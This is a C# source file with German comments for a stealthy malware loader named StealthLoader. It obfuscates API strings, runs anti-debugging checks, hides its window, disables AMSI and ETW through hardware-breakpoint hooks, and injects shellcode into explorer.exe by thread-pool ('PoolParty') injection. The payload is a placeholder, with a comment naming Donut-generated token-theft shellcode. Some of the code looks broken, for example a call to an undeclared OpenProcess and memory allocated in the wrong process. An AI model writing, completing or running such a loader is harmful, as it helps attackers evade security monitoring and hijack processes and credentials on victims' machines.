using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;

namespace StealthLoader
{
    #region String Obfuscation (XOR + Base64)
    public static class StringObfuscator
    {
        private static readonly byte[] _xorKey = GenerateXorKey();
        
        private static byte[] GenerateXorKey()
        {
            string seed = Environment.MachineName.Length.ToString() + 
                         Environment.ProcessorCount.ToString() +
                         DateTime.Now.DayOfYear.ToString();
            byte[] key = new byte[8];
            for (int i = 0; i < 8; i++)
                key[i] = (byte)(seed[i % seed.Length] ^ 0xAA);
            return key;
        }
        
        public static string Obfuscate(string input)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Convert.ToBase64String(bytes);
        }
        
        public static string Deobfuscate(string input)
        {
            byte[] bytes = Convert.FromBase64String(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Encoding.UTF8.GetString(bytes);
        }
    }
    
    public static class ObfuscatedStrings
    {
        // DLL-Namen
        public static readonly string Ntdll = StringObfuscator.Obfuscate("ntdll.dll");
        public static readonly string Amsi = StringObfuscator.Obfuscate("amsi.dll");
        public static readonly string Kernel32 = StringObfuscator.Obfuscate("kernel32.dll");
        public static readonly string Advapi32 = StringObfuscator.Obfuscate("advapi32.dll");
        
        // API-Namen
        public static readonly string NtContinue = StringObfuscator.Obfuscate("NtContinue");
        public static readonly string NtCreateFile = StringObfuscator.Obfuscate("NtCreateFile");
        public static readonly string NtAllocateVirtualMemory = StringObfuscator.Obfuscate("NtAllocateVirtualMemory");
        public static readonly string NtWriteVirtualMemory = StringObfuscator.Obfuscate("NtWriteVirtualMemory");
        public static readonly string NtCreateThreadEx = StringObfuscator.Obfuscate("NtCreateThreadEx");
        public static readonly string NtProtectVirtualMemory = StringObfuscator.Obfuscate("NtProtectVirtualMemory");
        public static readonly string AmsiScanBuffer = StringObfuscator.Obfuscate("AmsiScanBuffer");
        public static readonly string EtwEventWrite = StringObfuscator.Obfuscate("EtwEventWrite");
        
        // Prozessnamen
        public static readonly string Explorer = StringObfuscator.Obfuscate("explorer");
        public static readonly string Cmd = StringObfuscator.Obfuscate("cmd");
        
        // Keine Ausgaben im Loader - alles stumm
    }
    #endregion

    #region Native Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD
    {
        public uint ExceptionCode, ExceptionFlags;
        public IntPtr ExceptionRecord, ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
        public ulong[] ExceptionInformation;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS
    {
        public IntPtr ExceptionRecord, ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    #endregion

    #region Constants
    public static class Consts
    {
        public const uint CONTEXT_DEBUG_REGISTERS = 0x10010;
        public const uint STATUS_SINGLE_STEP = 0x80000004;
        public const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const uint SW_HIDE = 0;
        public const uint STARTF_USESTDHANDLES = 0x00000100;
        public const uint STARTF_USESHOWWINDOW = 0x00000001;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        public const uint THREAD_ALL_ACCESS = 0x1F03FF;
    }
    #endregion

    #region Native Imports (verschleiert)
    public class NativeMethods
    {
        private static string KERNEL32 => StringObfuscator.Deobfuscate(ObfuscatedStrings.Kernel32);
        private static string NTDLL => StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
        private static string ADVAPI32 => StringObfuscator.Deobfuscate(ObfuscatedStrings.Advapi32);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr AddVectoredExceptionHandler(uint FirstHandler, IntPtr Handler);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool RemoveVectoredExceptionHandler(IntPtr Handler);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, short nCmdShow);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtContinue(ref CONTEXT Context, int TestAlert);
    }
    #endregion

    #region Anti-Debug & Stealth Techniken
    public class Stealth
    {
        private static Random jitter = new Random();

        // PEB!BeingDebugged Check
        public static bool IsDebuggerPresent()
        {
            return NativeMethods.IsDebuggerPresent();
        }

        // NtGlobalFlag Check
        public static unsafe bool CheckNtGlobalFlag()
        {
            byte* peb = (byte*)NativeMethods.GetCurrentThread() + 0x60;
            int ntGlobalFlag = *(int*)(peb + 0xBC);
            return (ntGlobalFlag & 0x70) != 0;
        }

        // Timing Check
        public static bool TimingCheck()
        {
            long start = Stopwatch.GetTimestamp();
            Thread.Sleep(100);
            long end = Stopwatch.GetTimestamp();
            return (end - start) < 50000;
        }

        // Hardware Breakpoint Detection
        public static unsafe bool DetectHardwareBreakpoints()
        {
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;
            return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
        }

        // Fenster verstecken
        public static void HideWindow()
        {
            var handle = NativeMethods.GetConsoleWindow();
            if (handle != IntPtr.Zero)
                NativeMethods.ShowWindow(handle, Consts.SW_HIDE);
        }

        // Sleep Jitter
        public static void JitterSleep(int baseMs)
        {
            int variation = jitter.Next(-baseMs / 4, baseMs / 4);
            Thread.Sleep(Math.Max(10, baseMs + variation));
        }

        // Junk Code - nutzlose Operationen zur Verschleierung
        public static void InsertJunkCode()
        {
            int a = 42;
            int b = 7;
            int c = a ^ b;
            for (int i = 0; i < 10; i++) { c += i; }
            string dummy = "Dummy_" + c.ToString();
            var dummyList = new System.Collections.Generic.List<string>();
            for (int i = 0; i < 3; i++) dummyList.Add(dummy + i);
        }

        // Alle Anti-Debug Checks
        public static bool IsDebugged()
        {
            InsertJunkCode();
            return IsDebuggerPresent() || CheckNtGlobalFlag() || TimingCheck() || DetectHardwareBreakpoints();
        }
    }
    #endregion

    #region HellsHall + NtContinue Patchless Bypass
    public class PatchlessBypass
    {
        private struct SYSCALL_INFO
        {
            public uint SSN;
            public IntPtr SyscallInstruction;
        }

        private static SYSCALL_INFO ntcontinueInfo;
        private static IntPtr vehHandle;
        private static IntPtr amsiAddr;
        private static IntPtr etwAddr;

        private static unsafe IntPtr FindSyscallInstruction(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            for (int i = 0; i < 32; i++)
                if (addr[i] == 0x0F && addr[i + 1] == 0x05)
                    return new IntPtr(addr + i);
            return IntPtr.Zero;
        }

        private static unsafe uint GetSyscallNumber(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
                return *(uint*)(addr + 4);
            return 0;
        }

        private static SYSCALL_INFO ResolveNtContinue()
        {
            SYSCALL_INFO info = new SYSCALL_INFO();
            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            string ntContinueName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtContinue);

            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            if (ntdll == IntPtr.Zero) ntdll = NativeMethods.LoadLibrary(ntdllName);

            IntPtr funcAddr = NativeMethods.GetProcAddress(ntdll, ntContinueName);
            if (funcAddr == IntPtr.Zero) return info;

            info.SSN = GetSyscallNumber(funcAddr);
            info.SyscallInstruction = FindSyscallInstruction(funcAddr);

            if (info.SyscallInstruction == IntPtr.Zero)
            {
                string ntCreateName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtCreateFile);
                IntPtr otherFunc = NativeMethods.GetProcAddress(ntdll, ntCreateName);
                info.SyscallInstruction = FindSyscallInstruction(otherFunc);
            }
            return info;
        }

        private static unsafe int InvokeNtContinue(ref CONTEXT context, int testAlert)
        {
            byte[] stubCode = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8,
                (byte)(ntcontinueInfo.SSN & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 8) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 16) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 24) & 0xFF),
                0x48, 0xB8,
                (byte)((ulong)ntcontinueInfo.SyscallInstruction & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 8) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 16) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 24) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 32) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 40) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 48) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 56) & 0xFF),
                0xFF, 0xE0, 0xC3
            };

            IntPtr stubMemory = NativeMethods.VirtualAlloc(IntPtr.Zero, (uint)stubCode.Length, Consts.MEM_COMMIT, Consts.PAGE_EXECUTE_READWRITE);
            if (stubMemory == IntPtr.Zero) return NativeMethods.NtContinue(ref context, testAlert);

            Marshal.Copy(stubCode, 0, stubMemory, stubCode.Length);
            delegate* unmanaged<ref CONTEXT, int, int> stubDelegate = (delegate* unmanaged<ref CONTEXT, int, int>)stubMemory;
            int result = stubDelegate(ref context, testAlert);
            return result;
        }

        public static bool Initialize()
        {
            Stealth.InsertJunkCode();
            
            if (Stealth.IsDebugged()) return false;

            ntcontinueInfo = ResolveNtContinue();
            if (ntcontinueInfo.SSN == 0) return false;

            RegisterExceptionHandler();
            SetHardwareBreakpoints();
            return true;
        }

        private static void SetHardwareBreakpoints()
        {
            string amsiName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Amsi);
            string amsiFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.AmsiScanBuffer);
            string etwFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.EtwEventWrite);

            IntPtr amsi = NativeMethods.LoadLibrary(amsiName);
            amsiAddr = NativeMethods.GetProcAddress(amsi, amsiFunc);

            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            etwAddr = NativeMethods.GetProcAddress(ntdll, etwFunc);

            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;

            if (amsiAddr != IntPtr.Zero) ctx.Dr0 = (ulong)amsiAddr;
            if (etwAddr != IntPtr.Zero) ctx.Dr1 = (ulong)etwAddr;
            ctx.Dr7 = (amsiAddr != IntPtr.Zero ? 0x1 : 0) | (etwAddr != IntPtr.Zero ? 0x4 : 0);

            InvokeNtContinue(ref ctx, 0);
        }

        private static void RegisterExceptionHandler()
        {
            var del = new VectoredExceptionDelegate(Handler);
            IntPtr ptr = Marshal.GetFunctionPointerForDelegate(del);
            vehHandle = NativeMethods.AddVectoredExceptionHandler(1, ptr);
            GC.KeepAlive(del);
        }

        private delegate uint VectoredExceptionDelegate(IntPtr exceptionPointers);

        private static uint Handler(IntPtr exceptionPointers)
        {
            EXCEPTION_POINTERS ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
            EXCEPTION_RECORD er = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);

            if (er.ExceptionCode == Consts.STATUS_SINGLE_STEP)
            {
                CONTEXT ctx = Marshal.PtrToStructure<CONTEXT>(ep.ContextRecord);

                if ((amsiAddr != IntPtr.Zero && ctx.Rip == (ulong)amsiAddr) ||
                    (etwAddr != IntPtr.Zero && ctx.Rip == (ulong)etwAddr))
                {
                    ctx.Rax = 0x00000000;
                    ctx.Rip = FindRetGadget(ctx.Rip);
                    ctx.EFlags |= (1 << 16);
                    Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                    return Consts.EXCEPTION_CONTINUE_EXECUTION;
                }
            }
            return Consts.EXCEPTION_CONTINUE_SEARCH;
        }

        private static unsafe ulong FindRetGadget(ulong nearAddress)
        {
            byte* addr = (byte*)nearAddress;
            for (int i = 0; i < 0x10000; i++)
                if (addr[i] == 0xC3) return nearAddress + (ulong)i;
            return nearAddress + 5;
        }

        public static void Cleanup()
        {
            if (vehHandle != IntPtr.Zero) NativeMethods.RemoveVectoredExceptionHandler(vehHandle);
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
            InvokeNtContinue(ref ctx, 0);
        }
    }
    #endregion

    #region PoolParty Injection (TP_IO)
    public class PoolPartyInjector
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct TP_IO
        {
            public IntPtr Callback;
            public IntPtr CleanupGroup;
            public IntPtr Pool;
            public IntPtr FileHandle;
            public IntPtr IoCompletion;
            public IntPtr Overlapped;
            public uint CompletionKey;
            public uint Padding;
            public uint Information;
            public uint ErrorCode;
            public uint CompletionFlags;
        }

        [DllImport("ntdll.dll")]
        private static extern int NtCreateIoCompletion(out IntPtr IoCompletionHandle, uint DesiredAccess, IntPtr ObjectAttributes, uint NumberOfConcurrentThreads);

        [DllImport("ntdll.dll")]
        private static extern int NtSetIoCompletion(IntPtr IoCompletionHandle, ulong CompletionKey, IntPtr CompletionValue, IntPtr Information, uint Length);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        public static bool Inject(byte[] shellcode, int targetPid)
        {
            Stealth.InsertJunkCode();

            // 1. Zielprozess öffnen
            IntPtr hProcess = NativeMethods.OpenProcess(Consts.PROCESS_ALL_ACCESS, false, targetPid);
            if (hProcess == IntPtr.Zero) return false;

            // 2. Speicher allozieren
            IntPtr remoteMemory = NativeMethods.VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, Consts.MEM_COMMIT | Consts.MEM_RESERVE, Consts.PAGE_READWRITE);
            if (remoteMemory == IntPtr.Zero)
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            // 3. Shellcode schreiben
            int bytesWritten;
            if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode.Length, out bytesWritten))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            // 4. Speicherschutz auf ausführbar setzen
            uint oldProtect;
            if (!VirtualProtectEx(hProcess, remoteMemory, shellcode.Length, Consts.PAGE_EXECUTE_READ, out oldProtect))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            // 5. I/O Completion Port erstellen
            IntPtr ioCompletionHandle;
            NtCreateIoCompletion(out ioCompletionHandle, 0x00000003, IntPtr.Zero, 1);

            // 6. TP_IO Struktur
            TP_IO tpIo = new TP_IO();
            tpIo.Callback = remoteMemory;
            tpIo.IoCompletion = ioCompletionHandle;

            // 7. TP_IO in Zielprozess schreiben
            IntPtr remoteTpIo = NativeMethods.VirtualAlloc(IntPtr.Zero, (uint)Marshal.SizeOf<TP_IO>(), Consts.MEM_COMMIT | Consts.MEM_RESERVE, Consts.PAGE_READWRITE);
            byte[] tpIoBytes = StructureToBytes(tpIo);
            WriteProcessMemory(hProcess, remoteTpIo, tpIoBytes, tpIoBytes.Length, out bytesWritten);

            // 8. Auslösen
            NtSetIoCompletion(ioCompletionHandle, 0, remoteTpIo, IntPtr.Zero, 0);

            // 9. Cleanup
            NativeMethods.CloseHandle(ioCompletionHandle);
            NativeMethods.CloseHandle(hProcess);

            return true;
        }

        private static byte[] StructureToBytes<T>(T structure) where T : struct
        {
            int size = Marshal.SizeOf<T>();
            byte[] bytes = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(structure, ptr, false);
            Marshal.Copy(ptr, bytes, 0, size);
            Marshal.FreeHGlobal(ptr);
            return bytes;
        }
    }
    #endregion

    #region Loader Main - Komplett Stumm
    class Program
    {
        // Von Donut generierter Token Theft Shellcode
        // donut -f TokenTheftPayload.exe -a 2 -o payload.bin
        static byte[] tokenTheftShellcode = new byte[]
        {
            // HIER DEN SHELLCODE VON DONUT EINFÜGEN
            0x90, 0x90, 0x90  // Platzhalter
        };

        static void Main(string[] args)
        {
            // Fenster sofort verstecken
            Stealth.HideWindow();
            
            // Junk Code zur Verschleierung
            Stealth.InsertJunkCode();
            
            // Anti-Debug Checks
            if (Stealth.IsDebugged())
                Environment.Exit(0);
            
            // Sleep Jitter am Anfang
            Stealth.JitterSleep(100);
            
            // HellsHall + NtContinue Bypass
            if (!PatchlessBypass.Initialize())
            {
                // Fallback: Trotzdem fortsetzen, aber stumm
            }
            
            // Zielprozess finden (explorer.exe)
            int targetPid = 0;
            string explorerName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Explorer);
            Process[] processes = Process.GetProcessesByName(explorerName);
            
            if (processes.Length > 0)
                targetPid = processes[0].Id;
            else
                Environment.Exit(0);  // Kein Ziel -> beenden
            
            // Sleep Jitter vor Injection
            Stealth.JitterSleep(200);
            
            // PoolParty Injection
            bool success = PoolPartyInjector.Inject(tokenTheftShellcode, targetPid);
            
            // Sleep Jitter nach Injection
            Stealth.JitterSleep(500);
            
            // Cleanup
            PatchlessBypass.Cleanup();
            
            // Beenden - keine Ausgabe, kein Fenster
            Environment.Exit(0);
        }
    }
    #endregion
}